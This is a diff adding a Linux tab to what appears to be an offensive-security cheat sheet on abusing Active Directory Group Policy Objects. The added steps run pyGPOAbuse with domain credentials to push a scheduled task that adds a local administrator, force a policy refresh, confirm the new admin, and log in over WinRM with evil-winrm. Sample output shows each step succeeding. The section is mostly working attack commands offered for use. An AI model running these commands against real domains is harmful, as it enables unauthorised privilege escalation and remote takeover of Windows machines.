@@ -63,8 +63,70 @@ Get-GPOReport -Name '<GPO_NAME>' -ReportType HTML -Path "C:\ProgramData\GPORepor
 
 ### Abuse #1: Add Local Admin
 
-{{< tab set1 tab1 >}}Windows{{< /tab >}}
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+
+#### 1. Add Local Admin
+
+```console
+# GPO ID from dn of Deafult Domina Policy
+python3 pygpoabuse.py <DOMAIN>/<USER>:<PASSWORD> -gpo-id '<GPO_ID>'
+```
+
+```console {class="sample-code"}
+$ python3 pygpoabuse.py example.com/GPOADM:TestTest -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' 
+SUCCESS:root:ScheduledTask TASK_2300c834 created!
+[+] ScheduledTask TASK_2300c834 created!
+```
+
+#### 2. Force Reload
+
+```console
+gpupdate /force
+```
+
+```console {class="sample-code"}
+PS C:\programdata> gpupdate /force
+gpupdate /force
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+```
+
+#### 3. Check
+
+```console
+net localgroup administrators
+```
+
+```console {class="sample-code"}
+PS C:\programdata> net localgroup administrators
+net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+john
+The command completed successfully.
+```
+
+#### 4. Winrm
+
+```console
+evil-winrm -i <TARGET_DOMAIN> -u john -p 'H4x00r123..'
+```
+
+<small>*Ref: [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
 #### 1. Add Local Admin
 
